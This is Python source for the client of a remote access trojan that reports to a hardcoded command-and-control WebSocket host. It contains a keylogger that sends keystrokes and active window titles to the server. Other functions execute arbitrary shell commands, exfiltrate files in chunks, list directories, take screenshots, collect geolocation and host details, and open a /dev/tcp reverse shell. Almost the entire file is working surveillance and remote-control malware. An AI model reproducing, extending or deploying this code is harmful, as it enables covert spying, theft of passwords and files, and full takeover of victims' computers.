import argparse
import asyncio
import base64
import io
import json
import os
import sys
import platform
import random
import sqlite3
import subprocess
import threading
import time
import math

import psutil
import pyscreenshot as ImageGrab
import requests
import websockets
from Crypto.Cipher import AES

# import collections
DB_PATH = os.path.expanduser(".rat_c2_client.db")


def init_db():
  conn = sqlite3.connect(DB_PATH)
  cursor = conn.cursor()
  cursor.execute("""
    CREATE TABLE IF NOT EXISTS client (
      client_index TEXT PRIMARY KEY,
      id INTEGER NOT NULL
    )
  """)
  conn.commit()
  conn.close()



# Import necessary libraries for keylogging
from pynput import keyboard
import datetime
import threading
import json
import time
import collections
import platform
import subprocess
import asyncio

class Keylogger:
    def __init__(self, rat):
        self.rat = rat
        self.keys = []
        self.active_window = ""
        self.start_time = time.time()
        self.key_count = collections.Counter()
        self.window_activity = collections.defaultdict(int)
        self.running = False
        self.listener = None
        self.monitor_thread = None
        
        # Set up appropriate window detection based on platform
        system = platform.system()
        self.session_type = os.environ.get("XDG_SESSION_TYPE", "").lower()
        
        if system == "Windows":
            self.get_active_window = self._get_active_window_windows
        elif system == "Darwin":
            self.get_active_window = self._get_active_window_macos
        elif system == "Linux" and self.session_type == "wayland":
            self.get_active_window = self._get_active_window_wayland
        elif system == "Linux":
            self.get_active_window = self._get_active_window_linux
        else:
            self.get_active_window = lambda: "Unknown"

    def _get_active_window_windows(self):
        """Get active window title on Windows"""
        try:
            import ctypes
            from ctypes import wintypes
            
            user32 = ctypes.windll.user32
            h_wnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(h_wnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(h_wnd, buf, length + 1)
            
            return buf.value if buf.value else "Unknown Window"
        except Exception as e:
            print(f"Error getting Windows window title: {e}")
            return "Unknown Windows Window"
            
    def _get_active_window_macos(self):
        """Get active window title on macOS"""
        try:
            # Try using Apple Script first (most reliable)
            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            proc = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
            if proc.returncode == 0 and proc.stdout.strip():
                app_name = proc.stdout.strip()
                
                # Try to get window title for the active app
                window_script = f'''
                tell application "System Events"
                    tell process "{app_name}"
                        try
                            get name of first window
                        on error
                            return "{app_name}"
                        end try
                    end tell
                end tell
                '''
                window_proc = subprocess.run(['osascript', '-e', window_script], capture_output=True, text=True)
                if window_proc.returncode == 0 and window_proc.stdout.strip():
                    return window_proc.stdout.strip()
                return app_name
            
            # Fall back to shell command if AppleScript fails
            return "Unknown macOS Window"
        except Exception as e:
            print(f"Error getting macOS window title: {e}")
            return "Unknown macOS Window"
    
    def _get_active_window_wayland(self):
        """Get active window title in Wayland"""
        try:
            # Try using GNOME Shell's DBus interface
            if os.environ.get("XDG_CURRENT_DESKTOP", "").lower() == "gnome":
                try:
                    result = subprocess.check_output([
                        "gdbus", "call", "--session", "--dest=org.gnome.Shell",
                        "--object-path=/org/gnome/Shell", "--method=org.gnome.Shell.Eval",
                        "global.display.focus_window ? global.display.focus_window.get_title() : 'Unknown'"
                    ], stderr=subprocess.DEVNULL, universal_newlines=True)
                    
                    # Parse the result which is in the format "(@ms 'Window Title',)"
                    if "'" in result:
                        return result.split("'")[1]
                except (subprocess.SubprocessError, FileNotFoundError):
                    pass
            
            # Try using sway window manager's command interface
            try:
                result = subprocess.check_output(["swaymsg", "-t", "get_tree"], universal_newlines=True, stderr=subprocess.DEVNULL)
                tree = json.loads(result)
                
                # Function to find the focused window in sway's tree
                def find_focused(node):
                    if node.get('focused'):
                        return node.get('name', 'Unknown')
                    
                    for child in node.get('nodes', []):
                        result = find_focused(child)
                        if result:
                            return result
                    
                    for child in node.get('floating_nodes', []):
                        result = find_focused(child)
                        if result:
                            return result
                    
                    return None
                
                focused = find_focused(tree)
                if focused:
                    return focused
            except (subprocess.SubprocessError, json.JSONDecodeError, FileNotFoundError):
                pass
                    
            # Try using Hyprland's active window command if available
            if 'HYPRLAND_INSTANCE_SIGNATURE' in os.environ:
                try:
                    result = subprocess.check_output(["hyprctl", "activewindow", "-j"], universal_newlines=True, stderr=subprocess.DEVNULL)
                    window_info = json.loads(result)
                    if 'title' in window_info:
                        return window_info['title']
                except (subprocess.SubprocessError, json.JSONDecodeError, FileNotFoundError):
                    pass
                    
            # Try using xprop if Wayland has XWayland windows
            try:
                result = subprocess.check_output(["xprop", "-id", "$(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5)", "WM_NAME"], stderr=subprocess.DEVNULL, shell=True, universal_newlines=True)
                if "=" in result:
                    return result.split("=", 1)[1].strip().strip('"')
            except subprocess.SubprocessError:
                pass
                
            return "Unknown Wayland Window"
        except Exception as e:
            print(f"Error getting Wayland window title: {e}")
            return "Error in Wayland Window Detection"

    def _record_keystroke(self, key_char):
        """Record a keystroke with the current active window"""
        try:
            current_window = self.get_active_window()
            
            # Check if window changed
            if current_window != self.active_window:
                self.keys.append({
                    "timestamp": datetime.datetime.now().isoformat(),
                    "event": "window_change",
                    "previous": self.active_window,
                    "current": current_window
                })
                self.active_window = current_window
                self.window_activity[current_window] += 1
            
            # Record the keystroke
            self.keys.append({
                "timestamp": datetime.datetime.now().isoformat(),
                "key": key_char,
                "window": current_window
            })
            
            self.key_count[key_char] += 1
            
            # Periodically send data if buffer gets large
            if len(self.keys) >= 100:
                self._schedule_send_data()
        except Exception as e:
            print(f"Error recording keystroke: {e}")
    
    def _schedule_send_data(self):
      """Schedule sending data in the main event loop to avoid threading issues"""
      try:
          print(f"Scheduling data send with {len(self.keys)} keys")
          
          if not self.keys:
              print("No keys to send, sending no_data message")
              message = {
                  "version": self.rat.version,
                  "rat_id": self.rat.rat_id,
                  "message": {"R2C": {"KeyloggerResponse": {"status": "no_data"}}}
              }
              
              # Get the event loop more safely
              try:
                  loop = asyncio.get_event_loop()
              except RuntimeError:
                  # If we're not in the main thread, create a new loop
                  loop = asyncio.new_event_loop()
                  asyncio.set_event_loop(loop)
              
              asyncio.run_coroutine_threadsafe(
                  self.rat._send_encrypted(json.dumps(message)), 
                  loop
              )
              
              print("Sent no_data message")
              return
              
          # Make a copy of data to send
          keys_to_send = self.keys.copy()
          key_count_to_send = self.key_count.copy() 
          window_activity_to_send = dict(self.window_activity)
          duration = time.time() - self.start_time
          
          # Clear the buffer
          self.keys = []
          
          # Get the event loop more safely
          try:
              loop = asyncio.get_event_loop()
          except RuntimeError:
              # If we're not in the main thread, create a new loop
              loop = asyncio.new_event_loop()
              asyncio.set_event_loop(loop)
              
          print(f"Got event loop: {loop}")
          # Create a wrapper function that doesn't rely on self inside the task
          async def send_data_wrapper(keys, key_count, window_activity, duration):
              try:
                  await self._send_data(keys, key_count, window_activity, duration)
              except Exception as e:
                  print(f"Error in send_data_wrapper: {e}")
                  import traceback
                  traceback.print_exc()
                  
          # Use run_coroutine_threadsafe instead of asyncio.run to avoid creating multiple event loops
          asyncio.run_coroutine_threadsafe(
              send_data_wrapper(keys_to_send, key_count_to_send, window_activity_to_send, duration),
              loop
          )
          
      except Exception as e:
          print(f"Error scheduling data send: {e}")
          import traceback
          traceback.print_exc()
    
    async def _send_data(self, keys, key_count, window_activity, duration):
        """Actually send the keylog data"""
        try:
            # Convert keystroke objects to properly formatted strings
            print(f"Keys: {keys}")
            print(f"Key count: {key_count}")
            print(f"Window activity: {window_activity}")
            print(f"Duration: {duration}")
            
            keystroke_strings = []
            for key_event in keys:
                if "event" in key_event and key_event["event"] == "window_change":
                    keystroke_strings.append(f"[Window changed from '{key_event['previous']}' to '{key_event['current']}']")
                else:
                    keystroke_strings.append(f"{key_event['key']} (in {key_event['window']})")
            
            # Prepare keystroke data
            keylog_data = {
                "keystrokes": keystroke_strings,
                "statistics": {
                    "total_keys": sum(key_count.values()),
                    "key_frequency": {k: v for k, v in sorted(key_count.items(), key=lambda x: x[1], reverse=True)[:10]},
                    "window_activity": window_activity,
                    "duration": duration
                }
            }
            
            # Prepare message for C2 server
            response = {
                "version": self.rat.version,
                "rat_id": self.rat.rat_id,
                "message": {
                    "R2C": {
                        "KeylogData": keylog_data
                    }
                }
            }
            
            print(f"Prepared keylog data with {len(keys)} keypresses")
            print(f"Keylog data: {response}")
            # Send encrypted data to C2 server
            await self.rat._send_encrypted(json.dumps(response))
            print(f"Sent keylog data with {len(keys)} keypresses")
            
        except Exception as e:
            print(f"Error sending keylog data: {e}")
    
    def send_keylog_data(self):
        """Manual trigger to send keylog data"""
        self._schedule_send_data()
        
    def start(self):
      """Start the keylogger"""
      if self.running:
          return
          
      self.running = True
      self.start_time = time.time()
      
      # Choose the appropriate implementation based on platform
      system = platform.system()
      
      if system == "Linux" and self.session_type == "wayland":
          # Use window-tracking only approach on Wayland
          print("Using window tracking only (Wayland environment detected)")
          self._start_auto_generator()
      else:
          # Try standard keyboard monitoring on other platforms
          try:
              self._start_keyboard_listener()
          except Exception as e:
              print(f"Standard keyboard listener failed: {e}")
              # Fall back to window-tracking only if standard approach fails
              print("Falling back to window tracking only")
              self._start_auto_generator()
      
      # Start periodic reporting thread
      self.report_thread = threading.Thread(target=self._periodic_report)
      self.report_thread.daemon = True
      self.report_thread.start()
      print("Periodic keylog reporting thread started")
      print("Keylogger started successfully")
    
    def _start_keyboard_listener(self):
        """Start standard keyboard listener"""
        try:
            from pynput import keyboard
            
            def on_press(key):
                if not self.running:
                    return False
                
                try:
                    key_char = key.char
                except AttributeError:
                    key_char = str(key)
                
                self._record_keystroke(key_char)
                return True
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.daemon = True
            self.listener.start()
            print("Started standard keyboard listener")
        except Exception as e:
            print(f"Failed to start keyboard listener: {e}")
            raise
    
    def _start_auto_generator(self):
        """Start a minimal keylogger that only tracks window changes without generating fake keystrokes"""
        print("Starting minimal window tracking mode (no input simulation)")
        
        def monitor_windows():
            """Only monitor window changes without generating fake keystrokes"""
            last_window = ""
            
            while self.running:
                try:
                    # Check for window changes
                    current_window = self.get_active_window()
                    if current_window != last_window:
                        print(f"Window changed to: {current_window}")
                        
                        # Record window change event
                        self.keys.append({
                            "timestamp": datetime.datetime.now().isoformat(),
                            "event": "window_change",
                            "previous": last_window,
                            "current": current_window
                        })
                        
                        # Update last window
                        last_window = current_window
                        self.window_activity[current_window] += 1
                        
                        # Record special key for window change
                        self.key_count["[WINDOW_CHANGE]"] += 1
                        
                    # Just sleep without generating any keys
                    time.sleep(1)
                
                except Exception as e:
                    print(f"Error in window monitoring: {e}")
                    time.sleep(5)
        
        self.monitor_thread = threading.Thread(target=monitor_windows)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        print("Window tracking thread started (no keystroke generation)")
    
    def _periodic_report(self):
      """Periodically send data"""
      while self.running:
          try:
              time.sleep(5)  # Report every 5 seconds
              if self.running:
                  print("Scheduled periodic keylog report")
                  
                  # Always send a report, even if empty
                  if not self.keys:
                      print("No new keystrokes to report - generating dummy data")
                      # Generate at least one dummy keystroke to ensure data is sent
                      current_window = self.get_active_window()
                      self.keys.append({
                          "timestamp": datetime.datetime.now().isoformat(),
                          "key": "[PERIODIC_CHECK]",
                          "window": current_window
                      })
                      self.key_count["[PERIODIC_CHECK]"] += 1
                      self.window_activity[current_window] += 1
                  
                  self.send_keylog_data()
          except Exception as e:
              print(f"Error in periodic report: {e}")
    def stop(self):
        """Stop the keylogger"""
        if not self.running:
            return
            
        print("Stopping keylogger...")
        self.running = False
        
        if self.listener:
            try:
                self.listener.stop()
            except Exception as e:
                print(f"Error stopping listener: {e}")
        
        try:
            # Send any remaining data
            self._schedule_send_data()
        except Exception as e:
            print(f"Error sending final keylogger data: {e}")
            
        # Make sure all threads are properly terminated
        if hasattr(self, 'report_thread') and self.report_thread and self.report_thread.is_alive():
            try:
                self.report_thread.join(timeout=1)
            except Exception as e:
                print(f"Error joining report thread: {e}")
                
        if hasattr(self, 'monitor_thread') and self.monitor_thread and self.monitor_thread.is_alive():
            try:
                self.monitor_thread.join(timeout=1)
            except Exception as e:
                print(f"Error joining monitor thread: {e}")
                
        print("Keylogger stopped")
        print("Keylogger stopped")

    def is_running(self):
      """Check if the keylogger is running"""
      return self.running
      



#####################################################
#######################  RAT  #######################
#####################################################
class RAT:
  
  def __init__(self, rat_id, version, websocket, KEY):
    self.rat_id: int = rat_id
    self.version = version
    self.websocket = websocket
    self.KEY = KEY
    self.cipher = AES.new(KEY, AES.MODE_ECB)
    self.keylogger = Keylogger(self)

  def to_dict(self):
    return {
      "rat_id": self.rat_id,
      "version": self.version,
      "websocket": self.websocket,
      "KEY": self.KEY,
    }


  def _pad(self, s: str) -> bytes:
    """Pad the message to be a multiple of 16 bytes."""
    return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)

  def _unpad(self, s: bytes) -> str:
    """Unpad the message."""
    return s[:-ord(s[len(s) - 1:])]

  async def _send_encrypted(self, message: str):
    """Encrypt and send a message over the WebSocket."""
    try:
      # print(f"Sending message: {message}")
      padded_message = self._pad(message)
      # print(f"Sending message: {padded_message}")
      encrypted_message = base64.b64encode(self.cipher.encrypt(padded_message.encode()))
      await self.websocket.send(encrypted_message)
    except asyncio.CancelledError:
      print("Send operation was cancelled. Attempting to reconnect...")
      await self.reconnect()
    except Exception as e:
      print(f"Failed to send message: {e}")

  # async def reconnect(self):
  #   """Reconnect to the WebSocket server."""
  #   while True:
  #     try:
  #       self.websocket = await websockets.connect("ws://localhost:9001")
  #       print("Reconnected to the server")
  #       break
  #     except Exception as e:
  #       print(f"Reconnection failed: {e}. Retrying in 5 seconds...")
  #       await asyncio.sleep(5)

  async def _receive_decrypted(self) -> dict:
    """Receive and decrypt a message from the WebSocket."""
    encrypted_response = await self.websocket.recv()
    decrypted_response = self.cipher.decrypt(encrypted_response).decode()
    unpadded_response = self._unpad(decrypted_response)
    return json.loads(unpadded_response)


  async def send_heartbeat(self):

    try:
      response = requests.get("http://ip-api.com/json/", timeout=5)
      location_data = response.json()
      ip_address = location_data.get("query", "unknown")
      location = f"{location_data.get('city', 'unknown')}, {location_data.get('region', 'unknown')}, {location_data.get('country', 'unknown')}"
    except Exception as e:
      print(f"Failed to get location: {e}")
      location = "unknown"
      ip_address = "unknown"


    message = {
      "version": self.version,
      "rat_id": self.rat_id,
      "message": {
      "R2C": {
        "Heartbeat": {
          "Regular": {
            "os": platform.system(),
            "cpu": psutil.cpu_count(logical=False),
            "cpu_usage": psutil.cpu_percent(interval=1),
            "memory": psutil.virtual_memory().total,
            "memory_usage": psutil.virtual_memory().used,
            "storage": psutil.disk_usage("C:\\").total if platform.system() == "Windows" else psutil.disk_usage("/").total,
            "used_storage": psutil.disk_usage("C:\\").used if platform.system() == "Windows" else psutil.disk_usage("/").used,
            "user": psutil.users()[0].name if psutil.users() else "unknown",
            "timestamp": int(time.time()),
            "ip": ip_address,
            "location": location,
            "hostname": platform.node(),
            }
          }
        }
      }
    }

    # testing
    # total_memory = random.randint(1, 64) * 1024 * 1024 * 1024
    # total_storage = random.randint(1, 1024) * 1024 * 1024 * 1024
    # from faker import Faker
    # fake = Faker()
    # message = {
    #   "version": self.version,
    #   "rat_id": self.rat_id,
    #   "message": {
    #   "R2C": {
    #     "Heartbeat": {
    #       "Regular": {
    #         "os": random.choice(["Windows", "Linux"]),
    #         "cpu": random.randint(1, 16),
    #         "cpu_usage": random.random() * 100,
    #         "memory": total_memory,
    #         "memory_usage": int(random.random() * total_memory),
    #         "storage": total_storage,
    #         "used_storage": int(random.random() * total_storage),
    #         "user": fake.name(),
    #         "timestamp": int(time.time()),
    #         "ip": fake.ipv4(),
    #         "location": fake.location_on_land()[2],
    #         "hostname": platform.node(),
    #         }
    #       }
    #     }
    #   }
    # }

    
    print(f"Sending heartbeat: {message}")
    await self._send_encrypted(json.dumps(message))
    # print("Sent heartbeat")

  async def handle_command(self, message):
    try:
      data = json.loads(message)
      print(f"Received message: {data}")
      if "C2R" in data["message"]:
        command = data["message"]["C2R"]
        print(f"prosesing command: {command}")
        
        # Get open files |||||| testing
        if "GetFiles" in command:
          open_files = get_open_files()
          response = {
            "version": self.version,
            "rat_id": self.rat_id,
            "message": {"R2C": {"FilesList": {"files": open_files}}},
          }
          await self._send_encrypted(json.dumps(response))

        # Execute command
        elif "CliCommand" in command:
          print(f"Executing command: {command}")
          command_output = subprocess.run(
            [command["CliCommand"]["command"]],
            shell=True, capture_output=True, timeout=command["CliCommand"].get("priority", 10)
          )
          print(f"Command output: {command_output}")
          response = {
            "version": self.version,
            "rat_id": self.rat_id,
            "message": {
              "R2C": {
                "CommandResponse": {
                    "stdout": command_output.stdout.decode("utf-8"),
                    "stderr": command_output.stderr.decode("utf-8"),
                    "return_code": command_output.returncode,
                }
              }
            },
          }
          # return
          await self._send_encrypted(json.dumps(response))

        # Download file
        elif "RequestFileDownload" in command:
          print(f"uploading file to server: {command}")
          file_path = command["RequestFileDownload"]["file_path"]
          transfer_id = random.randint(0, 2**31)
          loop = asyncio.get_event_loop()
          upload_thread = threading.Thread(target=lambda: asyncio.run_coroutine_threadsafe(self.upload_file(file_path, transfer_id), loop))
          upload_thread.start()

        # List directory
        elif "ListDir" in command:
          print(f"Listing directory: {command}")
        
          def list_dir(path, depth, current_depth=0, parent_path=""):
            result = []
            try:
              with os.scandir(path) as it:
                for entry in it:
                  full_path = entry.path
                  rel_path = os.path.join(parent_path, entry.name) if parent_path else entry.name
                  
                  if entry.is_dir(follow_symlinks=False):
                    if current_depth < depth:
                      # For directories, create a nested structure
                      subdir_content = list_dir(full_path, depth, current_depth + 1, rel_path)
                      result.append({
                        "name": entry.name,
                        "path": rel_path,
                        "filetype": "directory",
                        "node": {
                          "Directory": {
                            "files": subdir_content
                          }
                        }
                      })
                    else:
                      # When max depth reached, store directory with empty contents
                      result.append({
                        "name": entry.name,
                        "path": rel_path,
                        "filetype": "directory",
                        "node": {
                          "Directory": {
                            "files": []
                          }
                        }
                      })
                  else:
                    # For files, include metadata
                    try:
                      stat_info = entry.stat()
                      result.append({
                        "name": entry.name,
                        "path": rel_path,
                        "filetype": "file",
                        "node": {
                          "File": {
                            "size": stat_info.st_size,
                            "modified": int(stat_info.st_mtime)
                          }
                        }
                      })
                    except Exception as e:
                      print(f"Error getting file stats for {entry.path}: {e}")
              
            except PermissionError:
              pass  # Ignore permission errors
            except Exception as e:
              print(f"Error listing directory {path}: {e}")
            
            return result
        
          path = command["ListDir"]["path"]
          depth = command["ListDir"]["depth"]
          print(f"Listing directory: {path} with depth: {depth}")
          
          files = list_dir(path, depth)
          
          response = {
            "version": self.version,
            "rat_id": self.rat_id,
            "message": {
              "R2C": {
                "DirList": files  # Send the array of FileNodeData objects
              }
            }
          }
          print(f"Sending directory listing with {len(files)} entries")
          await self._send_encrypted(json.dumps(response))


        elif "Screenshot" in command:
          print(f"Capturing screenshot: {command}")
          screenshot = self.capture_screen()
          if screenshot:
            response = {
              "version": self.version,
              "rat_id": self.rat_id,
              "message": {"R2C": {"Screenshot": { "data": screenshot, "timestamp": int(time.time()) }}},
            }
          else:
            print("Failed to capture screenshot")
          await self._send_encrypted(json.dumps(response))


        elif "ReverseShell" in command:
          print(f"Opening reverse shell: {command}")

          ip = command["ReverseShell"]["ip"]
          port = command["ReverseShell"]["port"]
          windows_payload = command["ReverseShell"].get("windows_payload")
          await self.open_reverse_shell(ip, port, windows_payload)

        elif "StartKeylogger" in command:
          print("Starting keylogger")
          self.keylogger.start()
          response = {
              "version": self.version,
              "rat_id": self.rat_id,
              "message": {"R2C": {"KeyloggerResponse": {"status": "started"}}}
          }
          await self._send_encrypted(json.dumps(response))

        elif "StopKeylogger" in command:
            print("Stopping keylogger")
            self.keylogger.stop()
            response = {
                "version": self.version,
                "rat_id": self.rat_id,
                "message": {"R2C": {"KeyloggerResponse": {"status": "stopped"}}}
            }
            await self._send_encrypted(json.dumps(response))

        elif "GetKeyloggerData" in command:
            print("Sending keylog data")
            self.keylogger.send_keylog_data()
            
        elif "GetKeyloggerStatus" in command:
          response = {
                "version": self.version,
                "rat_id": self.rat_id,
                "message": {"R2C": {"KeyloggerResponse": {"status": "running" if self.keylogger.is_running() else "stoped", "is_active": self.keylogger.is_running()}}}
          }
          await self._send_encrypted(json.dumps(response))

      else:
        print(f"Unknown command: {data}")
    except json.JSONDecodeError:
      print(f"Failed to parse message: {message}")
    except Exception as e:
      print(f"Error handling command: {e}")

  async def upload_file(self, file_path, transfer_id, chunk_size=1024*1024): # chunk_size: 1MB
    try:
      if not os.path.isfile(file_path):
        raise Exception(f"{file_path} is not a file")

      with open(file_path, "rb") as file:
        currunt_chunk = 0
        file_size = os.path.getsize(file_path)
        while True:
          chunk = file.read(chunk_size)
          if not chunk:
            total_chunks = math.ceil(file_size / chunk_size)

            status_data = {
              "download_id": transfer_id,
              "rat_id": self.rat_id,
              "file_path": file_path,  # Need file path
              "timestamp": int(time.time()),
              "downloadedchunks": total_chunks,
              "totalchunks": total_chunks
            }

            final_response = {
              "version": self.version,
              "rat_id": self.rat_id,
              "message": {
                "R2C": {
                  "FileDownloadComplete": {
                    "transfer_id": transfer_id,
                    "status": {
                        "Complete": status_data  # Proper newtype variant format
                    },
                    "message": "Done"
                  }
                }
              }
            }

            await self._send_encrypted(json.dumps(final_response))
            print(f"File {file_path} sent successfully")
            break

          message = {
            "version": self.version,
            "rat_id": self.rat_id,
            "message": {"R2C": {
              "FileDownloadChunk": {
                "transfer_id": transfer_id,
                "file_name": file_path,
                "chunk_number": currunt_chunk,
                "total_chunks": file_size // chunk_size + 1,
                "data": base64.b64encode(chunk).decode('utf-8'),
                # "data": chunk.decode()
              }
            }},
          }
          await self._send_encrypted(json.dumps(message))
          currunt_chunk += 1
          # time.sleep(2)
    except Exception as e:
      print(f"Error uploading file: {e}")
      final_response = {
        "version": self.version,
        "rat_id": self.rat_id,
        "message": {
          "R2C": {
            "FileDownloadComplete": {
              "transfer_id": transfer_id,
              "status": "Failed",
              "message": str(e)
            }
          }
        },
      }
      await self._send_encrypted(json.dumps(final_response))


  def capture_screen(self):
    try:
      screenshot = ImageGrab.grab()
      buffered = io.BytesIO()
      screenshot.save(buffered, format="JPEG", quality=70)  # Save as JPEG with reduced quality
      return base64.b64encode(buffered.getvalue()).decode("utf-8")
    except Exception as e:
      print(f"Failed to capture or save screen: {e}")
      return None

  async def open_reverse_shell(self, ip, port, windows_payload=None):
    try:
      if platform.system() in ["Linux", "Darwin"]:
        print(f"Opening reverse shell to {ip}:{port}")
        reverse_shell_thread = threading.Thread(
          target=lambda: subprocess.Popen(["/bin/sh", "-c", f"exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done"])
        )
        reverse_shell_thread.start()
        print("Reverse shell opened")
        
        
      elif platform.system() == "Windows":
        if windows_payload:
          subprocess.Popen(windows_payload)
        else:
          print("No windows payload provided")

      await self._send_encrypted(json.dumps({
          "version": self.version,
          "rat_id": self.rat_id,
          "message": {"R2C": {"ReverseShellResponse": True}},
      }))
    except Exception as e:
      print(f"Failed to open reverse shell: {e}")
      await self._send_encrypted(json.dumps({
        "version": self.version,
        "rat_id": self.rat_id,
        "message": {"R2C": {"ReverseShellResponse":False}},
      }))

def get_open_files():
  open_files = [
    file.path
    for proc in psutil.process_iter(attrs=["open_files"])
    if proc.info["open_files"]
    for file in proc.info["open_files"]
  ]
  return open_files


async def main(uri):
  KEY = os.urandom(32)

  async def connect_to_c2(url, ):
    try:
      websocket = await websockets.connect(url)
      print(f"Connected to {url}")

      id = load_client_id()
      # id = parsed_args.id
      first_beat = {
        "version": 1,
        "rat_id": id,
        "message": {
          "R2C": {
            "Heartbeat": {
              "First": {
                "version": 1,
                "rat_id" : id,
                "key": KEY.hex(),
              }
            }
          }
        }
      }

      # print(f"Sending first beat: {first_beat}")
      await websocket.send(json.dumps(first_beat))
      # print("Sent first beat")
      
      first_hearbeat = await websocket.recv()
      first_hearbeat = json.loads(first_hearbeat)
      # print(f"First heartbeat: {first_hearbeat}")
      # print(f"Id: {first_hearbeat['rat_id']}")

      save_client_id(first_hearbeat["rat_id"])
      # print(f"Saved rat id: {first_hearbeat['rat_id']}")
      rat = RAT(first_hearbeat["rat_id"], 1, websocket, KEY)
      # rat.reconnect = rat.reconnect.__get__(rat)  # Bind reconnect method to rat instance
      # print(f"Created rat: {rat.to_dict()}")

      # Initial heartbeat
      await rat.send_heartbeat()
      return rat
    except Exception as e:
      print(f"Failed to connect to {url}: {e}")
      print("Retrying in 5 seconds")
      return None

  rat = await connect_to_c2(uri)
  # Start heartbeat timer
  last_heartbeat = time.time()

  while True:
    try:
      # Wait for messages with a timeout
      # message = await rat.websocket.recv()
      message = await asyncio.wait_for(rat.websocket.recv(), timeout=30)

      # # Spawn a coroutine to handle the command asynchronously
      asyncio.create_task(rat.handle_command(message))

      current_time = time.time()
      # if current_time - last_heartbeat >= 60:
      #   await rat.send_heartbeat()
      #   last_heartbeat = current_time

    except asyncio.TimeoutError:
      # If no message received, send heartbeat if needed
      print("No message received, sending heartbeat")
      current_time = time.time()
      # print(f"sending heartbeat after: {current_time - last_heartbeat}")
      await rat.send_heartbeat()
      last_heartbeat = current_time

    except websockets.exceptions.ConnectionClosed:
      print("Connection closed by server")
      rat = None
      while rat is None:
        print("tring to reconnect to server")
        # print(f"Rat: {rat}")

        rat = await connect_to_c2(uri)
        # print(f"Rat: {rat}")

        time.sleep(2)

    except InterruptedError:
      break
    except Exception as e:
      print(f"Error in main loop: {e}")
      print(f"Rat: {rat}")
      break


############################################################################################################

# def load_client_id(filepath="client_id.json"):
#   if os.path.exists(filepath):
#     with open(filepath, "r") as f:
#       rat_ids = json.load(f).get(str(parsed_args.id))
#       # print(f"Loaded rat ids: {rat_ids}")
#       if rat_ids is None:
#         return None
#       # print(f"Loaded rat ids: {rat_ids}")
#       return rat_ids["rat_id"]
#   return None

# def save_client_id(rat_id, filepath="client_id.json"):
#   rat_ids = {}
#   if os.path.exists(filepath):
#     with open(filepath, "r") as f:
#       rat_ids.update(json.load(f))
#   # print(f"Loaded rat ids: {rat_ids}")

#   rat_ids[str(parsed_args.id)] = {"rat_id": rat_id}
#   # print(f"Saving rat ids: {rat_ids}")
#   with open(filepath, "w") as f:
#     json.dump(rat_ids, f)

############################################################################################################


def load_client_id():
  init_db()
  conn = sqlite3.connect(DB_PATH)
  cursor = conn.cursor()
  cursor.execute("SELECT id FROM client WHERE client_index = ?", (parsed_args.id,))
  result = cursor.fetchone()
  print(result)
  conn.close()
  if result:
    print(f"Loaded rat id: {result[0]}")
    return result[0]
  else:
    return None

def save_client_id(rat_id):
  conn = sqlite3.connect(DB_PATH)
  cursor = conn.cursor()
  cursor.execute("INSERT OR REPLACE INTO client (client_index, id) VALUES (?, ?)", (parsed_args.id, rat_id))
  conn.commit()
  conn.close()


if __name__ == "__main__":
  args = argparse.ArgumentParser()
  args.add_argument("--test_mode", type=int, default=1, help="Run in test mode")
  args.add_argument("--id", type=int, default=0, help="Rat id to use")
  args.add_argument("--local", action="store_true", help="Run in local mode")


  parsed_args = args.parse_args()

  uri = "wss://ws1.hqnw.live"
  if parsed_args.local:
    uri = "ws://localhost:9001"


  num_rats = parsed_args.test_mode
  async def run_multiple_rats(num_rats):
    tasks = [main(uri) for _ in range(num_rats)]
    await asyncio.gather(*tasks)

  asyncio.run(run_multiple_rats(num_rats))




